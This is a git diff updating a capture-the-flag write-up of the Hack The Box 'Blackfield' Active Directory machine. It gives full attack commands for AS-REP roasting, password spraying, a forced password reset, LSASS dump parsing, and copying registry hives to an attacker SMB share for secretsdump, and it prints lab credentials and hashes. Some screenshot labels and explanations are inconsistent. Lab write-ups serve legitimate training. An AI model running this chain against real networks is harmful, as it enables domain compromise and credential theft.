@@ -9,7 +9,6 @@
 | **Platform** | Hack The Box |
 | **Difficulty** | Hard |
 | **OS** | Windows (Active Directory) |
-| **Status** | ✅ Rooted |
 | **Key techniques** | Anonymous SMB user enum, AS-REP Roasting, `ForceChangePassword` via `net rpc`, LSASS dump analysis with **pypykatz**, `SeBackupPrivilege` → NetExec `backup_operator` module |
 
 ---
@@ -44,12 +43,12 @@ hash" is not the same as "I have Domain Admin".
 ## Recon
 
 ```bash
-nmap -p- --min-rate=5000 -oA blackfield 10.10.10.192
-nmap -p 53,88,135,389,445,593,3268,5985 -sCV -oA blackfield-scripts 10.10.10.192
+sudo nmap -p- -T4 10.129.229.17
+sudo nmap -p- -A -T4 10.129.229.17
 ```
 
 ![nmap TCP sweep](./assets/blackfield/01-nmap.png)
-![nmap script scan](./assets/blackfield/02-nmap-scripts.png)
+![nmap -A version + OS + host scripts](./assets/blackfield/02-nmap-scripts.png)
 
 Domain controller for `BLACKFIELD.local` — SMB, LDAP, Kerberos and
 WinRM. Textbook AD attack surface.
@@ -61,8 +60,8 @@ WinRM. Textbook AD attack surface.
 Guest / null SMB enumeration exposes `profiles$`:
 
 ```bash
-smbclient -N -L //10.10.10.192
-smbclient -N //10.10.10.192/profiles$
+smbclient -N -L //10.129.229.17
+smbclient -N //10.129.229.17/profiles$
 ```
 
 ![profiles$ readable anonymously](./assets/blackfield/03-smb-profiles.png)
@@ -75,7 +74,7 @@ their SAM name — a **free user list**, no credentials required.
 I dumped the listing and cleaned it into a plain wordlist:
 
 ```bash
-smbclient -N //10.10.10.192/profiles$ -c 'ls' \
+smbclient -N //10.129.229.17/profiles$ -c 'ls' \
   | awk '{print $1}' | sed '/^\.$\|^\.\.$\|^$/d' > users.txt
 wc -l users.txt
 ```
@@ -89,31 +88,54 @@ wc -l users.txt
 With a real user list, the fastest first swing at a DC is
 `GetNPUsers`: it asks the KDC for an AS-REP for each user, and any
 account with **`DONT_REQ_PREAUTH`** gives back a `krb5asrep$23$...`
-hash that's crackable offline.
+hash that's crackable offline. Piping through `grep -v` drops the
+noisy `KDC_ERR_C_PRINCIPAL_UNKNOWN` lines for names that don't map to
+real accounts:
 
 ```bash
 impacket-GetNPUsers blackfield.local/ -no-pass \
-  -usersfile users.txt -format hashcat -outputfile asrep.hash
+  -usersfile users.txt -dc-ip 10.129.229.17 \
+  | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
 ```
 
-![GetNPUsers walking the user list](./assets/blackfield/06-getnpusers.png)
+Almost everyone comes back with **`doesn't have UF_DONT_REQUIRE_PREAUTH
+set`** — except **`support`**, which coughs up an AS-REP hash:
 
-One user — **`support`** — coughs up a hash:
-
-![AS-REP hash for support](./assets/blackfield/07-asrep-hash-support.png)
+![GetNPUsers finds support](./assets/blackfield/07-asrep-hash-support.png)
 
 Hashcat mode `18200` + `rockyou`:
 
 ```bash
-hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
-![hashcat cracks support](./assets/blackfield/08-hashcat-crack.png)
+![hashcat cracks support → #00^BlackKnight](./assets/blackfield/08-hashcat-crack.png)
 
-Password: `#00^BlackKnight`. Confirmed with `nxc`:
+Password: `#00^BlackKnight`.
+
+### Password spray — sanity check
+
+Before pivoting, I sprayed the recovered password across the whole
+user list — it's cheap, and password reuse is normal in real
+environments. NetExec makes this a one-liner:
 
 ```bash
-nxc smb 10.10.10.192 -u support -p '#00^BlackKnight'
+nxc smb 10.129.229.17 -u users.txt -p password.txt --continue-on-success
+```
+
+![password spray across the user list](./assets/blackfield/06-getnpusers.png)
+
+Every account authenticates as **Guest** with `#00^BlackKnight` — so
+this password isn't unique to `support`, but it also doesn't give
+Guest access to any share worth mentioning. The one interesting
+result: **`audit2020` fails with `STATUS_LOGON_FAILURE`**, which
+means `audit2020` has a *different* password. That's the account the
+box wants me to escalate to.
+
+Confirmed the `support` creds cleanly:
+
+```bash
+nxc smb 10.129.229.17 -u support -p '#00^BlackKnight'
 ```
 
 ![valid creds for support](./assets/blackfield/09-support-valid.png)
@@ -126,7 +148,7 @@ Now that I can authenticate, I collected with `bloodhound-python`:
 
 ```bash
 bloodhound-python -u support -p '#00^BlackKnight' \
-  -d blackfield.local -c All -ns 10.10.10.192
+  -d blackfield.local -c All -ns 10.129.229.17
 ```
 
 ![bloodhound collection](./assets/blackfield/10-bloodhound-collect.png)
@@ -143,7 +165,7 @@ knowing the current one**. `net rpc password` is the classic way to
 abuse it from Linux:
 
 ```bash
-net rpc password "audit2020" "NewPass123!" -U "blackfield.local"/"support"%'#00^BlackKnight' -S 10.10.10.192
+net rpc password "audit2020" "Password123" -U "blackfield.local"/"support"%'#00^BlackKnight' -S 10.129.229.17
 ```
 
 ![net rpc password reset](./assets/blackfield/12-net-rpc-reset.png)
@@ -167,7 +189,7 @@ With `audit2020` I can see a share that `support` couldn't:
 memory dump. The interesting one is obvious:
 
 ```bash
-smbclient //10.10.10.192/forensic -U 'audit2020%NewPass123!' \
+smbclient //10.129.229.17/forensic -U 'audit2020%Password123' \
   -c 'cd memory_analysis; prompt OFF; recurse ON; mget *.zip'
 ```
 
@@ -192,15 +214,29 @@ pypykatz lsa minidump lsass.DMP
 ```
 
 ![installing pypykatz](./assets/blackfield/19-pypykatz-install.png)
-![pypykatz output — svc_backup NT hash](./assets/blackfield/20-pypykatz-svc-backup.png)
-![clean svc_backup NT hash](./assets/blackfield/21-svc-backup-nt-hash.png)
 
-Two useful pieces of material fall out:
+The dump has three logon sessions worth caring about:
 
-- **`svc_backup`** NT hash — a real domain service account.
-- **`Administrator`** NT hash — but this is **the local DSRM
-  Administrator**, not the domain one (see the "gotcha" section at
-  the end). Don't waste time trying to PtH with it.
+- **`svc_backup`** NT hash — a domain service account:
+
+  ![svc_backup logon session](./assets/blackfield/20-pypykatz-svc-backup.png)
+  ![clean svc_backup NT hash](./assets/blackfield/21-svc-backup-nt-hash.png)
+
+- **`Administrator@BLACKFIELD`** — a real Domain Admin session that
+  was active on the DC when the dump was taken, NT hash
+  `7f1e4ff8c6a8e6b6fcae2d9c0572cd62`:
+
+  ![Domain Administrator NT hash from pypykatz](./assets/blackfield/31-administrator-nt-hash.png)
+
+- **`DC01$`** machine account hash (interesting for silver tickets /
+  RBCD, not needed here):
+
+  ![DC01$ machine account hash](./assets/blackfield/32-dsrm-vs-domain-hash.png)
+
+The Domain Administrator hash is technically enough to `wmiexec` or
+`psexec` in, but the RM management group on Blackfield doesn't accept
+it via WinRM. I need something better — and I already have the
+prerequisite: `svc_backup` with `SeBackupPrivilege`.
 
 ---
 
@@ -210,7 +246,7 @@ Two useful pieces of material fall out:
 its hash directly — no cracking needed:
 
 ```bash
-evil-winrm -i 10.10.10.192 -u svc_backup -H <NT-hash>
+evil-winrm -i 10.129.229.17 -u svc_backup -H <NT-hash>
 ```
 
 ![evil-winrm as svc_backup](./assets/blackfield/22-evilwinrm-svc-backup.png)
@@ -230,72 +266,114 @@ walk off the DC with the SAM database and the LSA secrets.
 
 ### The manual way (works, but noisy)
 
-For understanding, the canonical chain is:
+For understanding, the canonical chain is: open a shell on the DC as
+`svc_backup`, `reg save` the `SAM` and `SYSTEM` hives, drag them back
+to Kali over SMB, and run `secretsdump` locally.
 
-```powershell
-reg save hklm\sam  C:\Temp\sam
-reg save hklm\system C:\Temp\system
-reg save hklm\security C:\Temp\security
+Shell back in as `svc_backup`:
+
+```bash
+evil-winrm -i 10.129.229.17 -u svc_backup -H <NT-hash>
 ```
 
-![reg save hives](./assets/blackfield/25-shell.png)
-![smbserver.py hosting my share](./assets/blackfield/26-smbserver-host.png)
-![hives saved on the DC](./assets/blackfield/27-reg-save-sam-system.png)
-![copying to my SMB server](./assets/blackfield/28-copy-sam-system.png)
+![evil-winrm shell as svc_backup](./assets/blackfield/25-shell.png)
 
-…then `impacket-secretsdump -sam sam -system system -security security LOCAL`
-on my side. That returns local SAM hashes and cached LSA secrets — but
-it's a lot of moving parts.
+Host a share on the attacker box:
+
+```bash
+impacket-smbserver share ./ -smb2support
+```
+
+![impacket-smbserver serving my working dir](./assets/blackfield/26-smbserver-host.png)
+
+On the DC, save the two hives that matter:
+
+```powershell
+reg save hklm\sam    C:\TEmp\sam
+reg save hklm\system C:\TEmp\system
+dir C:\TEmp
+```
+
+![reg save sam + system on the DC](./assets/blackfield/27-reg-save-sam-system.png)
+
+Copy them to the share I'm hosting on Kali:
+
+```powershell
+copy sam    \\10.10.14.90\share
+copy system \\10.10.14.90\share
+```
+
+![hives copied to my SMB server](./assets/blackfield/28-copy-sam-system.png)
+
+Then parse them locally:
+
+```bash
+impacket-secretsdump -system system -sam sam local
+```
+
+![impacket-secretsdump on the exfiltrated hives](./assets/blackfield/30-nxc-admin-cleartext.png)
+
+That gives back the **local SAM** hashes — including
+`Administrator:500:...:67ef902eae0d740df6257f273de75051`. Important:
+that `Administrator:500` is the DC's **local** account, not the
+domain one (see the "gotcha" below). It's not enough on its own — I
+need the LSA secrets too.
 
 ### The clean way — NetExec `backup_operator` module
 
 NetExec has a **`backup_operator`** module that does the whole thing
-remotely: it opens the WinReg service, saves `SAM`/`SYSTEM`/`SECURITY`
-in memory, streams them back, and runs `secretsdump` against them —
-one command, no files staged on the target:
+remotely: it uses `SeBackupPrivilege` to save `SAM`/`SYSTEM`/`SECURITY`
+via the WinReg service, streams them back, and runs `secretsdump`
+against them — one command, no files staged on the target:
 
 ```bash
-nxc smb 10.10.10.192 -u svc_backup -H <NT-hash> -M backup_operator
+nxc smb 10.129.229.17 -u svc_backup -H <NT-hash> -M backup_operator
 ```
 
-![backup_operator dumping the hives](./assets/blackfield/29-nxc-backup-operator.png)
+![backup_operator dumping SAM + SYSTEM + SECURITY](./assets/blackfield/29-nxc-backup-operator.png)
 
 This is the "new for me" bit of the box, and it's what I'm keeping in
 muscle memory. Same primitive (`SeBackupPrivilege` → registry hives),
-one command instead of ten.
+one command instead of ten. The output includes everything
+`secretsdump` normally gives you, plus what the manual way missed —
+the cached credentials from the SECURITY hive. One of those lines is:
 
-The dump surfaces the **domain** Administrator's **cleartext**
-password (recovered from LSA secrets / cached credentials on the DC):
+```
+(Unknown User):###_ADM1N_3920_###
+```
 
-![domain Administrator cleartext credential](./assets/blackfield/30-nxc-admin-cleartext.png)
-![domain Administrator NT hash](./assets/blackfield/31-administrator-nt-hash.png)
+That's the Domain Administrator's **cleartext** password, cached by
+the DC. Game over.
 
 ### Gotcha — three different Administrator credentials
 
-Blackfield hands out three different "Administrator" credentials, and
-this trips people up the first time they see it:
+Blackfield hands out three different "Administrator" credentials in
+three different places, and the first time you see them they're easy
+to conflate:
 
-![DSRM local hash vs domain Administrator hash side by side](./assets/blackfield/32-dsrm-vs-domain-hash.png)
+| # | What | Where it comes from | Value on this box |
+|---|---|---|---|
+| 1 | **Domain Administrator NT hash** | `pypykatz` on the LSASS dump (Domain Admin was logged on the DC) | `7f1e4ff8c6a8e6b6fcae2d9c0572cd62` |
+| 2 | **Local (DSRM) Administrator NT hash** | Local SAM — via `reg save` + `secretsdump local`, or the `Administrator:500` line in `backup_operator` output | `67ef902eae0d740df6257f273de75051` |
+| 3 | **Domain Administrator cleartext** | LSA cached credentials in the SECURITY hive — the `(Unknown User)` line from `backup_operator` | `###_ADM1N_3920_###` |
 
-1. **Local DSRM `Administrator` NT hash** — from `pypykatz` on the
-   LSASS dump. This is the Directory Services Restore Mode account
-   baked into the DC's own SAM. It **only logs into the DC in DSRM /
-   offline mode** by default — PtH against `\\dc01` as `Administrator`
-   with this hash will fail against the domain.
-2. **Domain `Administrator` NT hash** — from the LSA secrets dumped
-   by `backup_operator`. This is the real Domain Admin.
-3. **Domain `Administrator` cleartext password** — also surfaced by
-   `backup_operator` (cached credential). Same account as #2.
+The two NT hashes look identical in shape but represent two
+different accounts (Local Administrator on the DC vs. Domain
+Administrator in AD). Trying #2 as a Pass-the-Hash against
+`Administrator` over WinRM returns `STATUS_LOGON_FAILURE` (visible
+in the `backup_operator` output above) — because from the domain's
+perspective, that hash belongs to a completely different SID.
 
-The lesson: when a DC gives you an `Administrator` hash, always check
-whether it came from the DC's local SAM (DSRM) or from the domain
-account. They look identical in the output; only the source tells you
-which one is which.
+The lesson: an `Administrator` hash from a DC isn't automatically
+Domain Admin. Check the source (local SAM vs. LSA / LSASS) before
+burning cycles on it.
 
 ### Root
 
+The cleartext from `backup_operator` gets me straight in over WinRM:
+
 ```bash
-evil-winrm -i 10.10.10.192 -u Administrator -p '<cleartext>'
+evil-winrm -i 10.129.229.17 -u Administrator -p '###_ADM1N_3920_###'
 ```
 
 ![evil-winrm as Administrator](./assets/blackfield/33-evilwinrm-admin.png)
